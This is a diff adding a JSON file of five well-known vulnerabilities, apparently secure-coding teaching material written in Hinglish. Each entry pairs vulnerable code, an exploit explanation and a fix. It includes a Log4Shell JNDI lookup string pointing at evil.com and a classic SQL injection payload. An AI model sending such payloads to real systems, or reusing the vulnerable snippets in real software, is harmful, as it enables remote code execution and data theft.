@@ -1,0 +1,64 @@
+{
+  "cves": [
+    {
+      "id": "CVE-2021-44228",
+      "name": "Log4Shell",
+      "severity": "CRITICAL",
+      "owasp": "A03 - Injection",
+      "cwe": "CWE-502",
+      "description": "December 2021 mein Java ki Log4j library mein mili. Practically poori internet affected thi — Microsoft, Apple, Amazon, Tesla sab.",
+      "vulnerable_code": "${jndi:ldap://evil.com/exploit}",
+      "how_exploit": "Attacker yeh string kisi bhi input mein bhejta tha. Log4j ise log karte waqt automatically execute karta tha aur attacker ke server se code download karke run karta tha.",
+      "fix": "Log4j version 2.17.1+ pe upgrade karo. JNDI lookup disable karo.",
+      "fixed_code": "log4j2.formatMsgNoLookups=true"
+    },
+    {
+      "id": "CVE-2014-0160",
+      "name": "Heartbleed",
+      "severity": "CRITICAL",
+      "owasp": "A02 - Cryptographic Failures",
+      "cwe": "CWE-126",
+      "description": "OpenSSL library mein memory leak bug. Server ki private memory padhna possible tha — passwords, private keys sab.",
+      "vulnerable_code": "memcpy(bp, p, payload);\n// payload size check nahi tha!",
+      "how_exploit": "Attacker ek specially crafted heartbeat request bhejta tha jisme payload size zyada hoti thi. Server bina check ke extra memory return karta tha.",
+      "fix": "OpenSSL 1.0.1g ya usse upar update karo.",
+      "fixed_code": "if (payload + padding > s->s3->rrec.length)\n    return 0; // Request reject karo"
+    },
+    {
+      "id": "OWASP-A03-SQLi",
+      "name": "SQL Injection Classic",
+      "severity": "CRITICAL",
+      "owasp": "A03 - Injection",
+      "cwe": "CWE-89",
+      "description": "Sabse common aur dangerous vulnerability. Database ko directly control karna possible ho jaata hai.",
+      "vulnerable_code": "query = \"SELECT * FROM users WHERE name='\" + username + \"'\"",
+      "how_exploit": "Username mein dalo: ' OR '1'='1\nQuery ban jaati hai: SELECT * FROM users WHERE name='' OR '1'='1'\nResult: Poora database expose!",
+      "fix": "Parameterized queries use karo — user input ko query se alag rakho.",
+      "fixed_code": "cursor.execute('SELECT * FROM users WHERE name=?', (username,))"
+    },
+    {
+      "id": "OWASP-A01-IDOR",
+      "name": "IDOR - Broken Access Control",
+      "severity": "HIGH",
+      "owasp": "A01 - Broken Access Control",
+      "cwe": "CWE-284",
+      "description": "2021 mein OWASP #1 vulnerability. URL mein ID change karke kisi aur ka data access karna.",
+      "vulnerable_code": "# URL: /profile?id=123\nuser = db.get_user(request.args.get('id'))\nreturn user.data  # Koi check nahi!",
+      "how_exploit": "URL mein id=123 ko id=124 karo — kisi aur ka profile dikh jaata hai. Authentication check nahi hai server side pe.",
+      "fix": "Har request pe server side authorization check karo.",
+      "fixed_code": "user = db.get_user(request.args.get('id'))\nif user.id != current_user.id:\n    return 403  # Forbidden\nreturn user.data"
+    },
+    {
+      "id": "OWASP-A07-BrokenAuth",
+      "name": "Broken Authentication",
+      "severity": "HIGH",
+      "owasp": "A07 - Auth Failures",
+      "cwe": "CWE-287",
+      "description": "Weak authentication mechanisms jo attackers ko accounts hijack karne deti hain.",
+      "vulnerable_code": "# Weak JWT secret\njwt.encode(payload, 'secret', algorithm='HS256')\n# Password without hashing\ndb.save(password=user_password)",
+      "how_exploit": "Weak JWT secret brute force se crack ho sakta hai. Plain text passwords database leak mein seedha milte hain.",
+      "fix": "Strong secrets use karo, passwords hash karo, MFA implement karo.",
+      "fixed_code": "import secrets\nimport bcrypt\njwt_secret = secrets.token_hex(32)\nhashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt())"
+    }
+  ]
+}
